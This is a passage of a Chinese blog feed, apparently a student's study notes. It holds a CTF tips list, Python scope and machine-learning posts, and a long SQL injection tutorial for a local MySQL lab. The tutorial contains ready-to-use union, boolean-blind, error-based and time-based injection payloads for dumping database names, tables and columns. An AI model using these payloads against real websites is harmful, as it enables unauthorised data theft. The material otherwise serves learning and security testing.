href="https://omega-coder.github.io/ctf/writeups/2018/04/21/Click_Me_Chall/" target="_blank" rel="noopener">关于referer请求头</a></h3><h3 id="18-XEE漏洞"><a href="#18-XEE漏洞" class="headerlink" title="18.XEE漏洞"></a>18.XEE漏洞</h3><h3 id="19-path、dir、file、pag、page、archive、p、eng这些关键字眼可能暗示存在文件包含。"><a href="#19-path、dir、file、pag、page、archive、p、eng这些关键字眼可能暗示存在文件包含。" class="headerlink" title="19.path、dir、file、pag、page、archive、p、eng这些关键字眼可能暗示存在文件包含。"></a>19.<code>path、dir、file、pag、page、archive、p、eng</code>这些关键字眼可能暗示存在文件包含。</h3><h3 id="20-system-eval-两个函数是可以对open-basedir绕过的两个函数，这函数不受open-basedir的限制。"><a href="#20-system-eval-两个函数是可以对open-basedir绕过的两个函数，这函数不受open-basedir的限制。" class="headerlink" title="20. system(),eval(),两个函数是可以对open_basedir绕过的两个函数，这函数不受open_basedir的限制。"></a>20. <code>system()</code>,<code>eval()</code>,两个函数是可以对<code>open_basedir</code>绕过的两个函数，这函数不受<code>open_basedir</code>的限制。</h3><p><a href="https://ctftime.org/writeup/10041" target="_blank" rel="noopener">例子</a></p><h3 id="21-SHA1-Collision-attack"><a href="#21-SHA1-Collision-attack" class="headerlink" title="21.SHA1 Collision attack"></a>21.<a href="https://security.googleblog.com/2017/02/announcing-first-sha1-collision.html" target="_blank" rel="noopener">SHA1 Collision attack</a></h3><p>hash1PDF重名hash攻击于去年实现</p><h3 id="22-在一些设计浏览器的ctf中-有个网址可以查看各个浏览器以及各个版本对一些html的支持情况，从而发现一些端倪。caniuse"><a href="#22-在一些设计浏览器的ctf中-有个网址可以查看各个浏览器以及各个版本对一些html的支持情况，从而发现一些端倪。caniuse" class="headerlink" title="22.在一些设计浏览器的ctf中,有个网址可以查看各个浏览器以及各个版本对一些html的支持情况，从而发现一些端倪。caniuse"></a>22.在一些设计浏览器的ctf中,有个网址可以查看各个浏览器以及各个版本对一些html的支持情况，从而发现一些端倪。<a href="https://caniuse.com/" target="_blank" rel="noopener">caniuse</a></h3><h3 id="23-SSTI白皮书"><a href="#23-SSTI白皮书" class="headerlink" title="23.SSTI白皮书"></a>23.<a href="https://portswigger.net/kb/papers/serversidetemplateinjection.pdf" target="_blank" rel="noopener">SSTI白皮书</a></h3>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>python变量作用域的思考</title>
      <link href="/2017/12/12/python%E5%8F%98%E9%87%8F%E4%BD%9C%E7%94%A8%E5%9F%9F%E7%9A%84%E6%80%9D%E8%80%83/"/>
      <url>/2017/12/12/python%E5%8F%98%E9%87%8F%E4%BD%9C%E7%94%A8%E5%9F%9F%E7%9A%84%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<blockquote><h4 id="最近学计算机数学，当中有数论的相关应用，很多算法设计涉及了python中的变量作用域，举出其中的一个例子，我就是慢慢了解python变量作用域机制的。"><a href="#最近学计算机数学，当中有数论的相关应用，很多算法设计涉及了python中的变量作用域，举出其中的一个例子，我就是慢慢了解python变量作用域机制的。" class="headerlink" title="最近学计算机数学，当中有数论的相关应用，很多算法设计涉及了python中的变量作用域，举出其中的一个例子，我就是慢慢了解python变量作用域机制的。"></a>最近学计算机数学，当中有数论的相关应用，很多算法设计涉及了python中的变量作用域，举出其中的一个例子，我就是慢慢了解python变量作用域机制的。</h4></blockquote><h5 id="这段代码基本涉及了大部分的作用域知识-python3-6"><a href="#这段代码基本涉及了大部分的作用域知识-python3-6" class="headerlink" title="这段代码基本涉及了大部分的作用域知识(python3.6)"></a>这段代码基本涉及了大部分的作用域知识(python3.6)</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_variable_effect</span><span class="params">()</span>:</span></span><br><span class="line">    a=<span class="number">1</span></span><br><span class="line">    print(<span class="string">"iner a="</span>,a)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">local_variable</span><span class="params">()</span>:</span></span><br><span class="line">        a=<span class="number">4</span></span><br><span class="line">        print(<span class="string">"run local_variable with a equaling to 4"</span>)</span><br><span class="line">    local_variable()    </span><br><span class="line">    print(<span class="string">"iner a="</span>,a)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">change_ext_fun_variable</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">nonlocal</span> a</span><br><span class="line">        a=<span class="number">5</span></span><br><span class="line">        print(<span class="string">"run chanfe_ext_fun_variable with a equaling to 5"</span>)</span><br><span class="line">    change_ext_fun_variable()</span><br><span class="line">    print(<span class="string">"iner a="</span>,a)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">change_global</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">global</span> a</span><br><span class="line">        a=<span class="number">20</span></span><br><span class="line">        print(<span class="string">"run change_global with a equaling to 20"</span>)</span><br><span class="line">    change_global()</span><br><span class="line">    print(<span class="string">"iner a="</span>,a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a=<span class="number">10</span></span><br><span class="line">print(<span class="string">"global a="</span>,a)</span><br><span class="line">test_variable_effect()</span><br><span class="line">print(<span class="string">"global a="</span>,a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出为：</span><br><span class="line"><span class="keyword">global</span> a= <span class="number">10</span></span><br><span class="line">iner a= <span class="number">1</span></span><br><span class="line">run local_variable <span class="keyword">with</span> a equaling to <span class="number">4</span></span><br><span class="line">iner a= <span class="number">1</span></span><br><span class="line">run chanfe_ext_fun_variable <span class="keyword">with</span> a equaling to <span class="number">5</span></span><br><span class="line">iner a= <span class="number">5</span></span><br><span class="line">run change_global <span class="keyword">with</span> a equaling to <span class="number">20</span></span><br><span class="line">iner a= <span class="number">5</span></span><br><span class="line"><span class="keyword">global</span> a= <span class="number">20</span></span><br></pre></td></tr></table></figure><h5 id="值得注意的是类似列表这样的可变参数，和上述的作用域有不同之处，具体代码如下，是一个实现整数分解素数化，也就是算数基本定理。"><a href="#值得注意的是类似列表这样的可变参数，和上述的作用域有不同之处，具体代码如下，是一个实现整数分解素数化，也就是算数基本定理。" class="headerlink" title="值得注意的是类似列表这样的可变参数，和上述的作用域有不同之处，具体代码如下，是一个实现整数分解素数化，也就是算数基本定理。"></a>值得注意的是类似列表这样的可变参数，和上述的作用域有不同之处，具体代码如下，是一个实现整数分解素数化，也就是算数基本定理。</h5><p>这是一次偶然的机会，由于疏忽考虑了子函数对存在的列表的作用范围，发现代码竟然出奇的按照了我的思路去运行，也就有了对列表这类可变参数的作用范围的思考。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factorization</span><span class="params">(loop_key)</span>:</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">内嵌函数实现静态变量的功效</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">global</span> rep_divisor</span><br><span class="line">rep_divisor=[]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loop_mod</span><span class="params">(loop_key)</span>:</span></span><br><span class="line">num=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,loop_key//<span class="number">2</span>+<span class="number">1</span>):</span><br><span class="line"><span class="keyword">if</span> loop_key%i==<span class="number">0</span>:</span><br><span class="line">num.append(i)</span><br><span class="line"><span class="keyword">if</span> num:</span><br><span class="line">max_num=max(num)</span><br><span class="line">rep_divisor.append(loop_key/max_num)</span><br><span class="line">loop_key=max_num</span><br><span class="line">loop_mod(loop_key)<span class="comment">#递归</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">rep_divisor.append(loop_key)</span><br><span class="line">divisor=list(set(rep_divisor))</span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> divisor:</span><br><span class="line">print(key,<span class="string">"num:"</span>,rep_divisor.count(key))</span><br><span class="line">loop_mod(loop_key)<span class="comment">#函数内部自调用</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">key=<span class="number">34560</span><span class="comment">#需要运算的数</span></span><br><span class="line">factorization(key)</span><br></pre></td></tr></table></figure><a id="more"></a><h5 id="更为直观的一段代码体现，"><a href="#更为直观的一段代码体现，" class="headerlink" title="更为直观的一段代码体现，"></a>更为直观的一段代码体现，</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loop_append</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        num.append(i)</span><br><span class="line"></span><br><span class="line">num=[]</span><br><span class="line">loop_append()</span><br><span class="line">print(num)</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出为：[1, 2, 3, 4, 5, 6, 7, 8, 9]</span></span><br></pre></td></tr></table></figure><h5 id="对于字典类型是否是一样的呢"><a href="#对于字典类型是否是一样的呢" class="headerlink" title="对于字典类型是否是一样的呢?"></a>对于字典类型是否是一样的呢?</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loop_add</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        num[<span class="string">"key&#123;&#125;"</span>.format(i)]=i</span><br><span class="line"></span><br><span class="line">num=&#123;&#125;</span><br><span class="line">loop_add()</span><br><span class="line">print(num)</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出为：</span></span><br><span class="line"><span class="comment"># &#123;'key1': 1, 'key2': 2, 'key3': 3, 'key4': 4, 'key5': 5, 'key6': 6, 'key7': 7, 'key8': 8, 'key9': 9&#125;</span></span><br></pre></td></tr></table></figure><h5 id="由上可知我的猜想是正确的。所以python的变量作用范围问题是个有趣的东东。"><a href="#由上可知我的猜想是正确的。所以python的变量作用范围问题是个有趣的东东。" class="headerlink" title="由上可知我的猜想是正确的。所以python的变量作用范围问题是个有趣的东东。"></a>由上可知我的猜想是正确的。所以python的变量作用范围问题是个有趣的东东。</h5>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>machine-learning</title>
      <link href="/2017/12/01/machine-learning/"/>
      <url>/2017/12/01/machine-learning/</url>
      
        <content type="html"><![CDATA[<blockquote><p>近来学习了NG的machine—learning的课，上面使用matlab来实现的，但是基于对python的热爱以及本身python在数据处理上面的优势，所以打算近来把之前学到的机器学习的相关专题python来实现，这只是个序言，列举了一些常用的数据下载地址，和整个项目流程的框架。</p></blockquote><h5 id="项目地址传送门"><a href="#项目地址传送门" class="headerlink" title="项目地址传送门"></a><a href="https://github.com/IversionBY/sklearn_machine_learning" target="_blank" rel="noopener">项目地址传送门</a></h5><hr><h3 id="监督学习："><a href="#监督学习：" class="headerlink" title="监督学习："></a>监督学习：</h3><h4 id="1-线性回归"><a href="#1-线性回归" class="headerlink" title="1. 线性回归"></a>1. 线性回归</h4><h4 id="2-逻辑回归"><a href="#2-逻辑回归" class="headerlink" title="2. 逻辑回归"></a>2. 逻辑回归</h4><h4 id="3-支持向量机（svm）"><a href="#3-支持向量机（svm）" class="headerlink" title="3. 支持向量机（svm）"></a>3. 支持向量机（svm）</h4><h4 id="3-神经网络（正向传播）"><a href="#3-神经网络（正向传播）" class="headerlink" title="3. 神经网络（正向传播）"></a>3. 神经网络（正向传播）</h4><h4 id="4-神经网络（反向传播）"><a href="#4-神经网络（反向传播）" class="headerlink" title="4. 神经网络（反向传播）"></a>4. 神经网络（反向传播）</h4><hr><h3 id="非监督学习"><a href="#非监督学习" class="headerlink" title="非监督学习"></a>非监督学习</h3><h4 id="6-PCA"><a href="#6-PCA" class="headerlink" title="6. PCA"></a>6. PCA</h4><h4 id="7-K-MEANS"><a href="#7-K-MEANS" class="headerlink" title="7.K-MEANS"></a>7.K-MEANS</h4><h4 id="8-异常检测算法（Anomaly-Detection-System）"><a href="#8-异常检测算法（Anomaly-Detection-System）" class="headerlink" title="8.异常检测算法（Anomaly Detection System）"></a>8.异常检测算法（Anomaly Detection System）</h4><h4 id="9-推荐系统算法-Recommender-Systems"><a href="#9-推荐系统算法-Recommender-Systems" class="headerlink" title="9.推荐系统算法(Recommender Systems)"></a>9.推荐系统算法(Recommender Systems)</h4><hr><p>章节将追随上课进度持续更新，欢迎一起捣鼓</p><hr><h5 id="可以下载数据的网址"><a href="#可以下载数据的网址" class="headerlink" title="可以下载数据的网址"></a>可以下载数据的网址</h5><p><a href="http://archive.ics.uci.edu/ml/datasets.html" target="_blank" rel="noopener">UCI数据</a><br><a href="https://data.gov.uk/" target="_blank" rel="noopener">DATA</a><br><a href="https://www.zhihu.com/question/63383992" target="_blank" rel="noopener">知乎总结1</a><br><a href="https://zhuanlan.zhihu.com/p/25138563" target="_blank" rel="noopener">知乎总结2</a> </p>]]></content>
      
      
      <categories>
          
          <category> machine-learning </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>SQL捣鼓</title>
      <link href="/2017/11/23/SQL%E6%8D%A3%E9%BC%93/"/>
      <url>/2017/11/23/SQL%E6%8D%A3%E9%BC%93/</url>
      
        <content type="html"><![CDATA[<h3 id="以此篇文章，记录我sql注入学习的路程"><a href="#以此篇文章，记录我sql注入学习的路程" class="headerlink" title="以此篇文章，记录我sql注入学习的路程"></a>以此篇文章，记录我sql注入学习的路程</h3><blockquote><p>由于这是基于mysql的数据库来学习，所以把一些参考用到的资料摆在下面，另外这里没有包含混淆和绕过的技巧，只是说明了sql注入的原理</p></blockquote><h4 id="1-核心指导方针："><a href="#1-核心指导方针：" class="headerlink" title="1.核心指导方针："></a>1.核心指导方针：</h4><p>这是大致上的注入思路，后面只不过是对这些过程的具体实现</p><p>猜数据库</p><p><code>select schema_name from information_schema.schemata</code> </p><p>猜某库的数据表</p><p><code>select table_name from information_schema.tables where table_schema=&#39;xxxxx&#39;</code> </p><p>猜某表的所有列</p><p><code>Select column_name from information_schema.columns where table_name=&#39;xxxxx&#39;</code> </p><p>获取某列的内容  </p><p><code>Select * from xxx</code></p><p>查询用户的权限</p><p><code>SELECT file_priv FROM mysql.user WHERE user = &#39;xxx&#39;;</code></p><p>其中：information_schema本身是一个数据库保存了数据库里面的数据库，表单，表单列的相关信息，schemata表是记录各个数据库的名字，tables记录的是表名字的信息，而columns就可以依次类推其内容为列名。</p><a id="more"></a><hr><h4 id="2-some-detials"><a href="#2-some-detials" class="headerlink" title="2. some detials:"></a>2. some detials:<br></h4><ul><li>2.1 三种闭合方式:();’’;””;  </li><li>2.2 %20(空格),%27（单引号），%22(双引号)，%0A（=），%3E（&gt;）,3C(&lt;)，%23（#）  </li><li>2.3 order by 用来对列的判断，超出表中的列就会报错（其实order By 的语句就是对表中的数据进行按列排序，按照指定列进行排序，有升序（默认/ASC），降序（DESC）以及乱序（rand（）））  </li><li>2.4 union 联合查询语句需要select前后查询语句的列数相同，这就是为要用order by进行表单列的爆破，然后在payload中我们会经常看到如下语句的原因  </li><li>2.5 @@hostname：用来看server机的用户名  </li><li>2.6 uuid()函数用来查看服务器mac地址  </li><li>2.7 @@datadir是mysql的文件地址</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&apos; union select 1,2,group_concat(schema_name) from information_schema.schemata;</span><br></pre></td></tr></table></figure><blockquote><p>之前的都是一些基础和比较琐碎的细节，下来是盲注  </p></blockquote><h4 id="3-盲注"><a href="#3-盲注" class="headerlink" title="3.盲注"></a>3.盲注</h4><h5 id="盲注的分类（bool，报错，延时）："><a href="#盲注的分类（bool，报错，延时）：" class="headerlink" title="盲注的分类（bool，报错，延时）："></a>盲注的分类（bool，报错，延时）：</h5><h5 id="3-1-bool型（就是运用逻辑链接进行一些对单个值逐个猜解的操作）"><a href="#3-1-bool型（就是运用逻辑链接进行一些对单个值逐个猜解的操作）" class="headerlink" title="3.1 bool型（就是运用逻辑链接进行一些对单个值逐个猜解的操作）"></a>3.1 bool型（就是运用逻辑链接进行一些对单个值逐个猜解的操作）</h5><p>注意盲注中比较快速的猜解是采用二分法，即%3E去判断字符的范围<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">left(database(),1)&gt;’ s’               //核心语法</span><br><span class="line"></span><br><span class="line">?id=1%27and%20length(database())=8%23 //猜数据库长度</span><br><span class="line">?id=1%27and%20left(database(),1)%3E%27a%27--//逐个猜数据库名</span><br></pre></td></tr></table></figure></p><p>database()显示当前数据库名称，类似的还schema（），   </p><p>left(a,b)从左侧截取 a 的前 b 位  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr((select table_name from information_schema.tables where tables_schema=database()limit 0,1),1,1))=101  //核心语法</span><br><span class="line"></span><br><span class="line">//一下是以猜解表为例，其实这个方法也是可以运用到猜解列和数据库中</span><br><span class="line">?id=1%27and%20ascii(substr((select%20table_name%</span><br><span class="line">20from%20information_schema.tables%20where%20table_schema=database()%20limit%20</span><br><span class="line">0,1),1,1))%3E80--          //猜解指定数据库中的表，第一个字符（逐个猜解）</span><br><span class="line">?id=1%27and%20ascii(substr((select%20table_name%</span><br><span class="line">20from%20information_schema.tables%20where%20table_schema=database()%20limit%20</span><br><span class="line">0,1),2,1))%3E80--          //猜解第二个字符，后面依次类推</span><br><span class="line">?id=1%27and%20ascii(substr((select%20table_name%</span><br><span class="line">20from%20information_schema.tables%20where%20table_schema=database()%20limit%20</span><br><span class="line">1,1),1,1))%3E80--          //猜解第二个表，从第一个字段依次猜解</span><br></pre></td></tr></table></figure><p>substr(a,b,c)从 b 位置开始， 截取字符串 a 的 c 长度   </p><p>Ascii()将某个字符转换<br>为 ascii 值  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER</span><br><span class="line">BY id LIMIT 0,1),1,1))&gt;98%23</span><br></pre></td></tr></table></figure><p>mid(a,b,c)从位置 b 开始， 截取 a 字符串的 c 位  </p><p>Ord()函数同 ascii()， 将字符转为 ascll 值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and 1=(select 1 from information_schema.tables</span><br><span class="line">where table_schema=&apos;security&apos; and table_name regexp &apos;^us[a-z]&apos; limit 0,1)   //核心语法</span><br><span class="line"></span><br><span class="line">?id=1%27%20and%201=(select%201%20from%20information_sch</span><br><span class="line">ema.tables%20where%20table_schema=%27users%27%20and%20table_name%20regexp%20%</span><br><span class="line">27^us[a-z]%27%20limit%200,1)--         //猜解在users数据库中以us开头的表单是否存在，类似实现逐个字符的遍历</span><br><span class="line"></span><br><span class="line">?id=1%27%20and%201=(select%201%20from%20information_sch</span><br><span class="line">ema.columns%20where%20table_name=%27users%27%20and%20column_name%20regexp%20%</span><br><span class="line">27^us[a-z]%27%20limit%200,1)--       //猜解在user以us开头的数据表中是否存在us开头的列，依次类推</span><br></pre></td></tr></table></figure><p>regexp为正则关键字，注意”select 1”的使用会使得我们匹配成功的话以bool型的数据返回，那么整个句子就是正确的。<br>而其后面的”limit 0，1“是限定我们select返回的数据长度（如若不限定，那么我们得到的反馈有可能会是很多个1，而不是一个，因为匹配我们正则表达式的表可能不只一个），那么只要我们逐个字符的把表给遍历出来，特别注意这里的表是可以被全部遍历出来的，因为我们是在table_name下面对表进行遍历。28（4）</p><h5 id="3-2-报错型"><a href="#3-2-报错型" class="headerlink" title="3.2 报错型"></a>3.2 报错型</h5><p>顾名思义，就是存在错误回显的情况下，我们可以构造逻辑或者语法错误来使得sql返回一个异常，或者利用<a href="https://bugs.mysql.com/bug.php?id=8652" target="_blank" rel="noopener">bug</a>来直接回显我们的错误信息。  </p><p>网上的教程比叫多，以下链接值得参考：<br><a href="http://www.freebuf.com/articles/web/30841.html" target="_blank" rel="noopener">盲注测试高级技能</a><br><a href="http://blog.csdn.net/qq_35544379/article/details/77453019" target="_blank" rel="noopener">盲注原理讲解</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from information_schema.tables group by concat([sql],</span><br><span class="line">floor(rand(0)*2))  </span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">这个基于报错的语句是可以直接回显我们需要的东西的，只要在[sql]处插入你想要注入查询的语句就可  </span><br><span class="line">例如：select username from test limit 0,1；    user（），version（），database（），......</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">//如果禁用rand可以更改用户变量实现同样的目的</span><br><span class="line">select min(@a:=1) from information_schema.tables group by concat([sql],floor(@a:=(@a+1)%2));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">extractvalue(1,concat(0x7e,([sql]),0x7e))</span><br><span class="line">updatexml(1,concat(0x7e,([sql]),0x7e),1)</span><br><span class="line">// 上述的语句是基于两个解析xml的函数报错</span><br><span class="line"></span><br><span class="line">select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;</span><br><span class="line">//重复查询漏洞，貌似不可以把version（）改成其他函数，亲自实验过</span><br></pre></td></tr></table></figure><p>以上注入语句是可以嵌套使用的，这样的话，报错型盲注就和一般直接返回查询结果的注入没啥区别了，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select min(@a:=1) from information_schema.tables group by concat((select group_concat(schema_name) from information_schema.schemata),&apos;-----&apos;,floor(@a:=(@a+1)%2));</span><br><span class="line"></span><br><span class="line">//更多变形可以自行拓展，但需要注意，这里concat连接的字段必须是一行，所以需要用group_concat或者其他连接函数将它以一行返回，但是注意concat连接的字符如果过长则会返回正常的表格。</span><br></pre></td></tr></table></figure></p><blockquote><p>测试在5.7版本以上的mqsql书中介绍的bigint错误不会回显出我们查询的字段</p></blockquote><h5 id="3-3-延时注入"><a href="#3-3-延时注入" class="headerlink" title="3.3 延时注入"></a>3.3 延时注入</h5><p>两种：benchmark，sleep  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))</span><br><span class="line"></span><br><span class="line">//这个类型的单字节猜解比较可取</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">select sleep(find_in_set(mid(@@version, 1, 1), &apos;0,1,2,3,4,5,6,7,8,9,.&apos;));</span><br><span class="line"></span><br><span class="line">//注意在这里是可以一次把字符基于时间延时给遍历出来，但是却因为网速和cpu运行差异，使得我们的猜解不那么准确</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">UNION SELECT IF(SUBSTRING([sql],1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(‘M</span><br><span class="line">SG’ ,’ by 5 seconds’ )),null) FROM (select database() as current) as tb1;</span><br></pre></td></tr></table></figure><p>BENCHMARK(count,expr)用于测试函数的性能， 参数一为次数， 二为要执行的表达式<br>据说benchmark会占用比较多的内存。所以使用的时候需要视情况而定，尽可能少用吧。</p><h4 id="4-具体的实验环境搭建（windows10-wampserver3-1-0-php5-6-apache2-4-mysql5-7-回环网络地址127-0-0-1-，接着撸代码。"><a href="#4-具体的实验环境搭建（windows10-wampserver3-1-0-php5-6-apache2-4-mysql5-7-回环网络地址127-0-0-1-，接着撸代码。" class="headerlink" title="4.具体的实验环境搭建（windows10,wampserver3.1.0(php5.6,apache2.4,mysql5.7),回环网络地址127.0.0.1)，接着撸代码。"></a>4.具体的实验环境搭建（windows10,wampserver3.1.0(php5.6,apache2.4,mysql5.7),回环网络地址127.0.0.1)，接着撸代码。</h4><h5 id="测试数据库生成脚本"><a href="#测试数据库生成脚本" class="headerlink" title="测试数据库生成脚本"></a>测试数据库生成脚本</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$con = mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"wearefamily"</span>);</span><br><span class="line"><span class="keyword">if</span> (!$con)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysql_error());</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment"># 创建数据库</span></span><br><span class="line"><span class="keyword">if</span> (mysql_query(<span class="string">"CREATE DATABASE usertable"</span>,$con))</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"Database created"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"Error creating database: "</span> . mysql_error();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择和创建表</span></span><br><span class="line">mysql_select_db(<span class="string">"usertable"</span>, $con);</span><br><span class="line">$sql = <span class="string">"CREATE TABLE Persons </span></span><br><span class="line"><span class="string">(</span></span><br><span class="line"><span class="string">userid   varchar(15),</span></span><br><span class="line"><span class="string">username varchar(15),</span></span><br><span class="line"><span class="string">passwd varchar(15)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">)"</span>;</span><br><span class="line">mysql_query($sql,$con);</span><br><span class="line"></span><br><span class="line">mysql_close($con);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="登陆前端（post表单提交方式）"><a 